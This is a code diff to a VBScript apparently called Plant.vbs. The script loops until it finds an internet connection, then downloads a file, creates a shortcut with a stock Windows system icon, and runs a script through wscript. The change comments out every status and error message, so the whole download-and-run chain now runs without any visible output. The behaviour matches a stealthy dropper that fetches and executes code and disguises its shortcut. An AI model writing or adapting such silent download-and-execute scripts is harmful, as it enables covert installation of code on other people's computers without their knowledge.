@@ -30,13 +30,13 @@ Sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        WScript.Echo "Internet is connected (from Plant.vbs)!"
+        'WScript.Echo "Internet is connected (from Plant.vbs)!"
         DownloadFile
 		CreateShortcut
 		ChangeShortcutIcon
 		RunScript
     Else
-		WScript.Echo "Internet is not connected (from Plant.vbs) !"
+		'WScript.Echo "Internet is not connected (from Plant.vbs) !"
 		WScript.Sleep 3000 ' 3000 milliseconds = 3 seconds
 		CheckInternetConnection
     End If
@@ -56,7 +56,7 @@ Sub DownloadFile()
 
     ' Handle errors during the request
     If Err.Number <> 0 Then
-        WScript.Echo "Error during download request: " & Err.Description
+        'WScript.Echo "Error during download request: " & Err.Description
         Exit Sub
     End If
 
@@ -74,9 +74,9 @@ Sub DownloadFile()
 
     ' Handle errors during the file save
     If Err.Number <> 0 Then
-        WScript.Echo "Error saving the file: " & Err.Description
+        'WScript.Echo "Error saving the file: " & Err.Description
     Else
-        WScript.Echo "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)"
+        'WScript.Echo "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)"
     End If
 
     On Error GoTo 0 ' Disable error handling
@@ -92,9 +92,9 @@ Sub CreateShortcut()
 		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(destinationDirectory & "\" & shortcutFileName) ' Create a shortcut object		
 		objShortcut.TargetPath = sourceFilePath 											     ' Set the target path for the shortcut
 		objShortcut.Save                        												 ' Save the shortcut
-		WScript.Echo "Shortcut created successfully."
+		'WScript.Echo "Shortcut created successfully."
 	Else
-		WScript.Echo "Source file does not exist."
+		'WScript.Echo "Source file does not exist."
 	End If
 	
 End Sub
@@ -104,9 +104,9 @@ Sub ChangeShortcutIcon()
 		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(shortcutPath)                       ' Create a shortcut object
 		objShortcut.IconLocation = "%SystemRoot%\System32\SHELL32.dll,34"             ' Set the icon location for the shortcut Icon 34  
 		objShortcut.Save                                                              ' Save the shortcut
-		WScript.Echo "Shortcut icon changed successfully. (from Plant.vbs)"
+		'WScript.Echo "Shortcut icon changed successfully. (from Plant.vbs)"
 	Else
-		WScript.Echo "Shortcut file does not exist. (from Plant.vbs)"
+		'WScript.Echo "Shortcut file does not exist. (from Plant.vbs)"
 	End If
 End Sub
 
@@ -114,6 +114,6 @@ Sub RunScript()
 	If objFSO.FileExists(scriptPath) Then
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
-        WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)"
+        'WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)"
     End If
 End Sub
